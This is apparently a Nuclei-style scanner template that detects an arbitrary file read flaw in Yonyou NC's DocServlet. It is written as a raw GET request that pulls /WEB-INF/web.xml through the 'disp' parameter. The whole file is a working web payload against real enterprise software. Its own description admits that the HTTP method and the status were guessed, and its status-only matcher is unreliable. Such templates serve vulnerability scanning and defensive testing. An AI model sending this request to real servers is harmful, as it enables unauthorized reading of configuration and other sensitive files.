id: poc-57ceb1e61e97d42b2bf9
info:
  name: 用友NCnc.uap.lfw.file.action.DocServlet存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /servlet/~webrt/nc.uap.lfw.file.action.DocServlet?disp=/WEB-INF/web.xml HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
